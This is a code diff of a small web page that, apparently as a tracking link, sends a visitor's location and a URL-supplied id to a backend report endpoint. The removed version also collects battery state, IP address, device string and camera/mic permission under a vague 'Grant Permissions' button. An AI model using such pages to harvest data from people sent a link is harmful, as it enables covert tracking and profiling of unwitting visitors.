@@ -1,63 +1,34 @@
+<!-- public/index.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Permission Page</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location Share</title>
 </head>
 <body>
-  <h1>Grant Permissions</h1>
-  <button onclick="getPermissions()">Grant Now</button>
-
+  <h2>Location allow karein...</h2>
   <script>
-    async function getPermissions() {
-      let data = {
-        battery: null,
-        location: null,
-        ip: null,
-        device: navigator.userAgent,
-        chatId: new URLSearchParams(window.location.search).get("cid")
-      };
+    const userId = new URLSearchParams(window.location.search).get("id");
 
-      // Battery
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        data.battery = `${battery.level * 100}% ${battery.charging ? 'Charging' : 'Not Charging'}`;
-      }
-
-      // Location
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          data.location = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
-          sendData(data);
-        }, err => {
-          console.log("Location error", err);
-          sendData(data);
-        });
-      } else {
-        sendData(data);
-      }
-
-      // IP Address
-      fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(json => data.ip = json.ip);
-
-      // Camera & Mic Permissions
-      try {
-        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        data.media = "Permissions Granted";
-      } catch (err) {
-        data.media = "Denied or Not Available";
-      }
-    }
-
-    function sendData(data) {
-      fetch("/api/report", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(position => {
+        fetch('/api/report', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            user_id: userId,
+            lat: position.coords.latitude,
+            lon: position.coords.longitude
+          })
+        }).then(response => response.json())
+          .then(data => alert('Location shared successfully!'))
+          .catch(err => alert('Error: ' + err.message));
+      }, (error) => {
+        alert("Location permission denied or error occurred.");
       });
+    } else {
+      alert("Geolocation is not supported by this browser.");
     }
   </script>
 </body>
